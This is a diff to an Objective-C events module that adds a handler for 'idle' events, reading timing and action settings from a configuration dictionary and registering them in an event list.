@@ -1715,6 +1715,70 @@ typedef struct  {
   [pool release];
 }
 
+- (void)addIdleEvent: (NSDictionary *)anEvent
+{
+  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
+  
+  NSArray *keys;
+  NSArray *objects;
+  
+  NSNumber *defNum  = [NSNumber numberWithUnsignedInt: ACTION_UNKNOWN];
+  NSNumber *type    = [NSNumber numberWithUnsignedInt: EVENT_IDLE];
+  
+  NSNumber *action  = [anEvent objectForKey: EVENTS_ACTION_START_KEY];
+  NSNumber *enabled = [anEvent objectForKey: EVENT_ENABLED_KEY];
+  NSNumber *repeat  = [anEvent objectForKey: EVENT_ACTION_REP_KEY];
+  NSNumber *delay   = [anEvent objectForKey: EVENT_ACTION_DELAY_KEY];
+  NSNumber *iter    = [anEvent objectForKey: EVENT_ACTION_ITER_KEY];
+  NSNumber *end     = [anEvent objectForKey: EVENT_ACTION_END_KEY];
+  NSNumber *sec     = [anEvent objectForKey: EVENTS_IDLE_TIME_KEY];
+  
+  UInt32 seconds = [sec intValue];
+  
+  NSData *data = [NSData dataWithBytes: &seconds length: sizeof(UInt32)];
+  
+  keys = [NSArray arrayWithObjects: @"type", 
+                                    @"actionID", 
+                                    @"data",
+                                    @"status", 
+                                    @"monitor", 
+                                    @"enabled",
+                                    @"start",
+                                    @"repeat",
+                                    @"delay",
+                                    @"iter",
+                                    @"end",
+                                    nil];
+  
+  objects = [NSArray arrayWithObjects: type, 
+                                       action  != nil ? action  : defNum, 
+                                       data    != nil ? data    : defNum,
+                                       EVENT_START, 
+                                       @"", 
+                                       enabled != nil ? enabled : defNum,
+                                       action  != nil ? action  : defNum,
+                                       repeat  != nil ? repeat  : defNum,
+                                       delay   != nil ? delay   : defNum,
+                                       iter    != nil ? iter    : defNum,
+                                       end     != nil ? end     : defNum,
+                                       nil];
+  
+  NSDictionary *dictionary = [NSDictionary dictionaryWithObjects: objects
+                                                         forKeys: keys];
+  
+  NSMutableDictionary *eventConfiguration = [[NSMutableDictionary alloc] init];
+  
+  [eventConfiguration addEntriesFromDictionary: dictionary];
+  
+  [mEventsList addObject: eventConfiguration];
+  
+  [eventConfiguration release];
+  
+  NSLog(@"%s: event Idle: %@", __FUNCTION__, dictionary);
+  
+  [pool release];
+}
+
 // Done.
 // Fake event: never runned, but using when disable/enable a event by a action
 // (the parmater is the position of the event)
@@ -1899,6 +1963,10 @@ typedef struct {
           {
             // only iOS
             [self addACEvent: event];
+          }
+        else if ([eventType compare: EVENTS_IDLE_KEY] == NSOrderedSame) 
+          {
+            [self addIdleEvent: event];
           }
         else
           { // Default event: for keep order number in list when a actionEvent is triggered
